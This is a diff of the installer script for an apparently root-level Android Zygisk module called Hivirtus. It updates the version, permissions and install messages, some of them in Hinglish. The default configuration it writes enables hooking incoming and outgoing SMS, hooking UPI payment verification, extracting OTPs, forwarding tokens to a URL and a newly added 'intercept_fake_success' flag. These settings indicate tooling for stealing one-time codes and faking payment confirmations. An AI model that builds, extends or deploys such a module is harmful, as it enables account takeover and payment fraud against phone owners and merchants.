@@ -2,7 +2,7 @@
 # Hivirtus Zygisk Mode — Magisk / KernelSU / APatch / SukiSU installer
 
 ui_print "*******************************"
-ui_print "   Hivirtus Zygisk Mode v2.15.0  "
+ui_print "   Hivirtus Zygisk Mode v2.15.1  "
 ui_print "   Zygisk Base Mode By @Hivirtus  "
 ui_print "*******************************"
 
@@ -16,6 +16,7 @@ ui_print "- Installing to $MODPATH"
 set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
 [ -f "$MODPATH/post-fs-data.sh" ] && set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
 [ -f "$MODPATH/service.sh" ] && set_perm "$MODPATH/service.sh" 0 0 0755
+[ -f "$MODPATH/start_overlay.sh" ] && set_perm "$MODPATH/start_overlay.sh" 0 0 0755
 [ -f "$MODPATH/customize.sh" ] && set_perm "$MODPATH/customize.sh" 0 0 0755
 [ -f "$MODPATH/config.json" ] && set_perm "$MODPATH/config.json" 0 0 0644
 [ -f "$MODPATH/module.prop" ] && set_perm "$MODPATH/module.prop" 0 0 0644
@@ -43,6 +44,7 @@ if [ ! -f "$MODPATH/config.json" ]; then
   "hook_incoming_sms": true,
   "hook_outgoing_sms": true,
   "hook_upi_verification": true,
+  "intercept_fake_success": true,
   "auto_extract_otp": true,
   "auto_forward_token": true,
   "forward_url": "",
@@ -56,6 +58,8 @@ fi
 
 if [ -d /data/adb/ksu ] || [ -f /dev/kernelsu ]; then
   ui_print "- KernelSU detected"
+  ui_print "! KernelSU Next: Zygisk ON karo (Stopped = inject nahi hoga)"
+  ui_print "! KSU app → Zygisk → Enable → Reboot"
 elif [ -f /data/adb/magisk.db ]; then
   ui_print "- Magisk detected"
 elif [ -d /data/adb/apatch ]; then
@@ -65,7 +69,7 @@ fi
 echo "1" > /data/local/tmp/hivirtus_module_installed.flag
 chmod 644 /data/local/tmp/hivirtus_module_installed.flag 2>/dev/null
 
-ui_print "- Floating menu: HTML WebView UI (embedded, no APK)"
-ui_print "- Size optimized: arm64-only default build"
+ui_print "- Bubble: Zygisk + app_process fallback (auto)"
+ui_print "- Zygisk STOPPED ho to bhi bubble service.sh se start"
 ui_print "- Enable Zygisk in root manager"
 ui_print "- Reboot to activate"
